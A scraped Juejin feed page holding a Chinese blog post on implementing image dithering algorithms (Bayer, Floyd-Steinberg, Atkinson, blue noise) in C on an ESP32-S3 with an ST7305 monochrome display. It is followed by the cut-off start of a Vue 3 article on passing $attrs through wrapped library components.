.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文首发于我的个人博客：<a href="https://link.juejin.cn?target=https%3A%2F%2Fchaosgoo.com%2F2025%2F12%2F30%2FDitherpunk-The-Art-of-Dithering-2-ESP32%2F" target="_blank" title="https://chaosgoo.com/2025/12/30/Ditherpunk-The-Art-of-Dithering-2-ESP32/" ref="nofollow noopener noreferrer">chaosgoo.com</a>，欢迎来访交流。</p>
</blockquote>
<blockquote>
<p>由于掘金无法运行自定义的Javascript脚本,所以上一篇文章无法发布在此, 想要阅读上篇文章请到源站点了解更多,
<a href="https://link.juejin.cn?target=https%3A%2F%2Fchaosgoo.com%2F2025%2F12%2F22%2FDitherpunk-The-Art-of-Dithering%2F" target="_blank" title="https://chaosgoo.com/2025/12/22/Ditherpunk-The-Art-of-Dithering/" ref="nofollow noopener noreferrer">屏幕不够，算法来凑(一)：Ditherpunk 抖动算法原理与 JS 实时演示</a></p>
</blockquote>
<blockquote>
<p>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fchaosgoo.com%2F2025%2F12%2F22%2FDitherpunk-The-Art-of-Dithering%2F" target="_blank" title="https://chaosgoo.com/2025/12/22/Ditherpunk-The-Art-of-Dithering/" ref="nofollow noopener noreferrer">上篇文章</a>中我用 JS 实现了一个可交互的对比工具，建议配合食用以理解算法误差分配的数学原理。虽然原理通透了，但真正的挑战在于硬件端：<strong>如何在资源受限的嵌入式设备上复现这些效果？</strong></p>
</blockquote>
<p>本文将记录我基于 ESP32-S3 和一块 1.54 寸 ST7305 单色屏的实战过程，探讨如何在单片机上实现从基础的阈值法到复杂的误差扩散等多种图像处理算法。</p>

<h2 data-id="heading-0">0x01 硬件环境</h2>
<ul>
<li><strong>MCU</strong>: ESP32-S3 (当然，普通的 ESP32 甚至 ESP8266 也完全足以胜任)</li>
<li><strong>屏幕</strong>: 1.54 inch Monochrome Display 鱼鹰光电单色屏幕</li>
<li><strong>驱动</strong>: ST7305 (这种控制器也常见于一些黑白双色或黑白红三色的小尺寸墨水屏)</li>
<li><strong>分辨率</strong>: 200 x 200 (1-bit Monza, 纯黑白)</li>
</ul>
<p>选择 ESP32-S3 主要是因为其内置的大容量 SRAM（512KB+）和对 PSRAM 的支持，让我们在处理 200x200（只要 5KB）甚至更高分辨率的图像缓冲区时游刃有余。而 ST7305 是一款主要用于点阵电子纸显示器的驱动芯片，通过 SPI 接口通信。</p>
<h2 data-id="heading-1">0x02 核心挑战</h2>
<p>在 PC 网页端，我们有 <code>Float32Array</code> 和近乎无限的内存。但在 ESP32-S3 上，我们需要关注：</p>
<ol>
<li><strong>内存管理</strong>：尽量复用 Buffer，避免频繁 <code>malloc/free</code> 产生内存碎片。</li>
<li><strong>Gamma 校正</strong>：必须在 C 语言中手动实现 Gamma Table，否则画面会严重偏暗。</li>
<li><strong>驱动适配</strong>：屏幕通常需要较为复杂的 SPI 初始化序列，特别是针对不同的屏幕玻璃面板，需要配置正确的电压和驱屏波形。</li>
</ol>
<h2 data-id="heading-2">0x03 代码实现详解</h2>
<p>项目工程结构如下：</p>
<pre><code class="hljs language-text" lang="text">main/
├── blue_noise.h      // 预计算的蓝噪声纹理数组
├── esp_lcd_st7305.c  // 屏幕驱动实现
├── hello_world_main.c// 核心逻辑与算法实现
└── sample_img.h      // 测试用灰度图片数组
</code></pre>
<h3 data-id="heading-3">建立 Gamma 查找表 (LUT)</h3>
<p>正如第一篇所述，这是最关键的一步。如果不做 Gamma 校正，线性空间的抖动算法处理 sRGB 图片时，中间调会偏暗。由于 <code>powf</code> 函数在嵌入式上计算非常昂贵，我们绝对不能对每个像素实时计算。为了性能，我们在启动时预计算一个 256 长度的查找表。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// Gamma correction LUT (0-255 -&gt; 0.0-1.0 linear)</span>
<span class="hljs-type">static</span> <span class="hljs-type">float</span> s_gamma_lut[<span class="hljs-number">256</span>];

<span class="hljs-type">void</span> <span class="hljs-title function_">init_gamma_lut</span><span class="hljs-params">()</span> {
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) {
    <span class="hljs-comment">// sRGB to Linear: ((val / 255.0) ^ 2.2)</span>
    s_gamma_lut[i] = powf(i / <span class="hljs-number">255.0f</span>, <span class="hljs-number">2.2f</span>);
  }
}
</code></pre>
<p>任何后续的像素读取，都通过 <code>s_gamma_lut[pixel]</code> 来获取其线性亮度值。这是一种经典的空间换时间策略。</p>
<h3 data-id="heading-4">基础算法：Threshold &amp; Random</h3>
<p>最简单的算法往往是很好的基准线。</p>
<p><strong>Threshold (阈值法)</strong> ：
也就是二值化。这是最快的方法，但也是效果最差的方法。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">dither_threshold</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *src, <span class="hljs-type">uint8_t</span> *dst)</span> {
  <span class="hljs-built_in">memset</span>(dst, <span class="hljs-number">0</span>, ST7305_FRAMEBUFFER_SIZE);
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ST7305_WIDTH * ST7305_HEIGHT; i++) {
    <span class="hljs-type">float</span> val = s_gamma_lut[src[i]];
    <span class="hljs-type">bool</span> white = val &gt; <span class="hljs-number">0.5f</span>;
    set_pixel_1bit(dst, i % ST7305_WIDTH, i / ST7305_WIDTH, white);
  }
}
</code></pre>
<p><strong>实拍效果</strong>：细节大量丢失，俗称“两色图”。它只能保留最硬的边缘，几乎完全丢失了所有的灰度信息。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70d15449817c4b30b424ff2469ececba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=MSydDoaX%2BXNQrZIFwrJRvTvV6No%3D" alt="Threshold 效果" loading="lazy"/></p>
<p><strong>Random (随机抖动)</strong>
为了找回丢失的灰度，我们引入 <code>rand()</code> 来打破量化阶梯。通过给每个像素值增加一个随机噪声，使得原本在阈值附近的像素有一半概率翻转，从而宏观上表现出灰度。</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-type">float</span> noise = ((<span class="hljs-type">float</span>)rand() / RAND_MAX) - <span class="hljs-number">0.5f</span>; <span class="hljs-comment">// -0.5 to 0.5</span>
    <span class="hljs-type">bool</span> white = (val + noise) &gt; <span class="hljs-number">0.5f</span>;
</code></pre>
<p><strong>实拍效果</strong>：虽然有灰度感了，但画面非常脏，充满了白噪声。这种高频噪声在人眼看来就是“雪花点”，并不讨喜。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/820f402f90314055aa9e977324ea40e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=%2FsHViFFZ8zjxaxezO%2BAyYQYFzdk%3D" alt="Random 效果" loading="lazy"/></p>
<h3 data-id="heading-5">有序抖动：Bayer Matrix</h3>
<p>有序抖动非常适合没有 Framebuffer 的超低端单片机（如 Arduino Uno, ATtiny85），因为它是 <strong>Point-Operation（点操作）</strong>，不需要知道邻居像素的信息，也不需要存储上一行的误差。我们可以对每个像素独立计算。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">float</span> s_bayer_matrix[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = {
    {<span class="hljs-number">0.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">8.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">2.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">10.0f</span> / <span class="hljs-number">16.0f</span>},
    {<span class="hljs-number">12.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">4.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">14.0f</span> / <span class="hljs-number">16.0f</span>, <span class="hljs-number">6.0f</span> / <span class="hljs-number">16.0f</span>},
    <span class="hljs-comment">// ... complete matrix</span>
};

<span class="hljs-comment">// Inside loop</span>
<span class="hljs-type">float</span> threshold = s_bayer_matrix[y % <span class="hljs-number">4</span>][x % <span class="hljs-number">4</span>];
<span class="hljs-type">bool</span> white = (val &gt; threshold);
</code></pre>
<p><strong>实拍效果</strong>：经典的十字交叉网纹。这种风格在复古 GameBoy 游戏和早期的 Macintosh 系统中非常常见。它通过规则的纹理来模拟灰度，虽然看起来有点“人工”，但比随机抖动干净得多。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92dc20f567934ab0a6f1a10e3485fb8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=Alk6O56Xmscu7SFkYH8owDwjB%2FA%3D" alt="Bayer 效果" loading="lazy"/></p>
<h3 data-id="heading-6">误差扩散：Floyd-Steinberg &amp; Atkinson</h3>
<p>对于支持 Framebuffer 的设备（ESP32 有足够 RAM），误差扩散是最佳选择。你需要一个浮点数 Buffer 来存储扩散过程中的误差。</p>
<p><strong>Floyd-Steinberg</strong> 是教科书般的标准，扩散系数为 <code>7, 3, 5, 1</code> (/16)。它试图将量化产生的每一个误差都完美地分配给邻居，从数学上讲是最精确的。
<strong>实拍效果</strong>：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5fe814f9a294734a878cc8ab6c2b98f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=7muL6lMEqmikrcW5YXo3RbV3A5o%3D" alt="Floyd-Steinberg 效果" loading="lazy"/></p>
<p><strong>Atkinson</strong> 则更适合这种高解析度但低色深的屏幕。它由 Bill Atkinson 设计，不像 Floyd-Steinberg 那样保留 100% 的误差，而是只保留 75% 的误差用于扩散，这就人为制造了一些“死黑”和“死白”区域。这听起来像是缺点，但在低对比度的单色屏上，但这反而增加了局部对比度，让图像看起来更清晰锐利，减少了“蠕虫”伪影。</p>
<pre><code class="hljs language-c" lang="c">      <span class="hljs-comment">// Distribute 1/8 to neighbors (Atkinson)</span>
      <span class="hljs-type">float</span> err_part = quant_error / <span class="hljs-number">8.0f</span>;

      <span class="hljs-keyword">if</span> (x + <span class="hljs-number">1</span> &lt; ST7305_WIDTH)
        work_buf[y * ST7305_WIDTH + x + <span class="hljs-number">1</span>] += err_part;
      <span class="hljs-keyword">if</span> (x + <span class="hljs-number">2</span> &lt; ST7305_WIDTH)
        work_buf[y * ST7305_WIDTH + x + <span class="hljs-number">2</span>] += err_part;
      <span class="hljs-comment">// ... bottom neighbors</span>
</code></pre>
<p><strong>实拍效果</strong>：这是我在这块屏上最喜欢的算法。线条硬朗，质感极佳，特别适合显示文字和 icon 混合的 UI 界面。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33ed38844029418eaa3781c13fc4c2ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=IxI7FfOGOOxNMSXhQY8uQolXf0k%3D" alt="Atkinson 效果" loading="lazy"/></p>
<h3 data-id="heading-7">别有风味：Blue Noise (蓝噪声)</h3>
<p>如果在嵌入式设备上想要模拟胶片感，蓝噪声是唯一的选择。它的计算成本和 Bayer 一样低（只需要查表），但效果却能通过“排列无序但分布均匀”的噪点来欺骗人眼。</p>
<p>我们需要将一张预计算好的蓝噪声纹理转换成 C 数组 (<code>blue_noise.h</code>) 存储在 Flash 中。这意味着你需要牺牲几十 KB 的 Flash 空间来换取这种效果。</p>
<pre><code class="hljs language-c" lang="c">      <span class="hljs-comment">// Map 0-255 texture to 0.0-1.0</span>
      <span class="hljs-type">float</span> threshold = blue_noise_map[(y % BN_H) * BN_W + (x % BN_W)] / <span class="hljs-number">255.0f</span>;
      <span class="hljs-type">bool</span> white = (val &gt; threshold);
</code></pre>
<p><strong>实拍效果</strong>：非常自然的颗粒感，没有任何规律性条纹，就像一张老照片。这种算法特别适合显示人像和风景摄影。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d08df4e3841492c8b01201bd3b258f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhb3Nnb28=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770860905&amp;x-signature=NyqLWdcoHjdkCEQjiZOIy2OB0K4%3D" alt="Blue Noise 效果" loading="lazy"/></p>
<h2 data-id="heading-8">0x04 总结</h2>
<p>在 ESP32 这种级别的 MCU 上，我们完全可以实现高质量的即时图像抖动。不同的算法适用于不同的场景：</p>
<ul>
<li><strong>Bayer 有序抖动</strong>：计算开销最小，适合资源极端受限（如不带 RAM 的低端单片机）或复古风格游戏。</li>
<li><strong>Atkinson</strong>：对比度最高，边缘清晰，适合 UI 界面、文字混排场景。</li>
<li><strong>Blue Noise</strong>：颗粒感自然，适合显示摄影图片，但需要额外的 Flash 空间存储纹理。</li>
</ul>
<p>希望本文能为你在单色屏幕开发中提供一些思路。</p>
<p><strong>后记</strong>： 这个抖动算法实验是我 <strong>Friday Ink2</strong> 项目的一部分前瞻研究。如果你对如何将这种复古视觉效果应用到实际硬件感兴趣，欢迎访问我的个人博客 <a href="https://link.juejin.cn?target=https%3A%2F%2Fchaosgoo.com%2Fprojects%2F" target="_blank" title="https://chaosgoo.com/projects/" ref="nofollow noopener noreferrer">chaosgoo.com/projects/</a> 查阅更多 DIY 笔记。</p>
<h2 data-id="heading-9">0x05 参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsurma.dev%2Fthings%2Fditherpunk%2F" target="_blank" title="https://surma.dev/things/ditherpunk/" ref="nofollow noopener noreferrer">Ditherpunk — The article I wish I had about monochrome image dithering</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKevincoooool%2Fesp_lcd_st7305" target="_blank" title="https://github.com/Kevincoooool/esp_lcd_st7305" ref="nofollow noopener noreferrer">Kevincoooool/esp_lcd_st7305</a> - 本文 ST7305 驱动移植参考</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDuRuofu%2Fesp-idf-st7305-Ink-screen" target="_blank" title="https://github.com/DuRuofu/esp-idf-st7305-Ink-screen" ref="nofollow noopener noreferrer">DuRuofu/esp-idf-st7305-Ink-screen</a> - 另一个优秀的 ST7305 驱动实现</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[组件库二次封装避坑指南：attrs透传、事件合并等4大痛点，一次性根治！]]></title>    <link>https://juejin.cn/post/7602825342228906018</link>    <guid>https://juejin.cn/post/7602825342228906018</guid>    <pubDate>2026-02-05T02:45:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602825342228906018" data-draft-id="7602135278665121844" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="组件库二次封装避坑指南：attrs透传、事件合并等4大痛点，一次性根治！"/> <meta itemprop="keywords" content="JavaScript,面试,Vue.js"/> <meta itemprop="datePublished" content="2026-02-05T02:45:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="boooooooom"/> <meta itemprop="url" content="https://juejin.cn/user/3078273283917399"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            组件库二次封装避坑指南：attrs透传、事件合并等4大痛点，一次性根治！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3078273283917399/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    boooooooom
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T02:45:07.000Z" title="Thu Feb 05 2026 02:45:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    19
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">正文</h2>
<h3 data-id="heading-1">一、前言：为什么组件库二次封装总踩坑？</h3>
<p>在Vue/React项目开发中，组件库（Element Plus、Ant Design等）二次封装是常态——为了统一项目样式、复用业务逻辑、简化使用成本，我们常会基于基础组件封装业务组件。</p>
<p>但封装过程中，几乎所有开发者都会遇到同样的困境：attrs透传丢失、事件冲突不触发、slots插槽错乱、TS类型报错……这些痛点看似细小，却会导致封装组件易用性骤降、维护成本翻倍，甚至违背二次封装的初衷。</p>
<p>本文聚焦组件库二次封装最核心的4大痛点，结合Vue3实操案例，从“痛点分析+解决方案”双维度拆解，新手也能直接套用，彻底告别封装内耗。</p>
<h3 data-id="heading-2">二、核心痛点拆解+实操解决方案（重点！）</h3>
<p>以下4大痛点，覆盖组件库二次封装80%的高频问题，优先解决“实用性”，所有方案均适配Vue3（<code>&lt;script setup&gt;+TS</code>），兼顾易用性和规范性。</p>
<h4 data-id="heading-3">痛点1：attrs透传丢失（最常见，新手必踩）</h4>
<h5 data-id="heading-4">痛点表现</h5>
<p>基于基础组件封装时，父组件传递的额外属性（如placeholder、disabled、class），无法透传到底层基础组件，导致基础组件功能失效。</p>
<p>示例：封装ElInput组件，父组件传递placeholder，却无法显示。</p>
<pre><code class="hljs language-ts" lang="ts">&lt;!-- 封装组件 <span class="hljs-title class_">MyInput</span>.<span class="hljs-property">vue</span>（有问题写法） --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ElInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"inputVal"</span> /&amp;<span class="hljs-attr">gt</span>; &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">未透传attrs</span>，<span class="hljs-attr">父组件传递的placeholder无法生效</span> <span class="hljs-attr">--</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'modelValue'</span>])
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:modelValue'</span>])
<span class="hljs-keyword">const</span> inputVal = <span class="hljs-title function_">toRef</span>(props, <span class="hljs-string">'modelValue'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 父组件使用 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">MyInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"val"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"请输入内容"</span> /&gt;</span> <span class="hljs-comment">&lt;!-- placeholder不显示 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span>解决方案：v-bind=<span class="hljs-string">"$attrs"</span> 完整透传<span class="hljs-title class_">Vue3</span>中，$attrs包含父组件传递的所有未被props声明的属性，通过v-bind=<span class="hljs-string">"$attrs"</span>，可将所有attrs一次性透传到底层基础组件，同时注意inheritAttrs的合理使用。&lt;!-- 封装组件 <span class="hljs-title class_">MyInput</span>.<span class="hljs-property">vue</span>（正确写法） --&gt;
